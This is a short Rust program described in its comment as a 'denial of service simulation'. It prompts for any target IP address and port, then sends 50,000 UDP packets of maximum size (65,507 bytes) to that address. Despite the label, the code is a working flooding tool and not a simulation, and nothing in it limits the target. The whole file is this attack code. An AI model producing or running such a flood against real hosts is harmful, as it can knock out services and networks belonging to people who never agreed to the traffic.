// basic rust denial of service simulation

use std::io::{self, Write};
use std::net::UdpSocket;

fn main() {
    print!("[-] Enter target IP address: ");
    io::stdout().flush().unwrap();

    let mut ip_address = String::new();
    io::stdin().read_line(&mut ip_address).unwrap();
    let ip_address = ip_address.trim();

      print!("[-] Enter target port: ");    // open tcp/udp port running on the ip
      io::stdout().flush().unwrap();

    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = port.trim();
    let max_udp_size = 65507;
    let payload = vec![0u8; max_udp_size];
    let server_address = format!("{}:{}", ip_address, port);

    
    match UdpSocket::bind("0.0.0.0:0") {
        Ok(socket) => {
            for _ in 0..50000{  // number of requests, can be adjusted but your device may lag after a longer time
            match socket.send_to(&payload, &server_address) {
                Ok(size) => {
                    println!("Sent {} bytes to {}:{}", size, ip_address, port);
                }
                Err(e) => eprintln!("err sending data: {}", e),
            }}


            let mut buffer = [0; 512];
            match socket.recv_from(&mut buffer) {
                Ok((size, _src)) => {
                    println!("Received: {}", String::from_utf8_lossy(&buffer[..size]));
                }
                Err(e) => eprintln!("err receiving data: {}", e),
            }
        }

        Err(e) => eprintln!("socket bind failure: {}", e),
    }
}
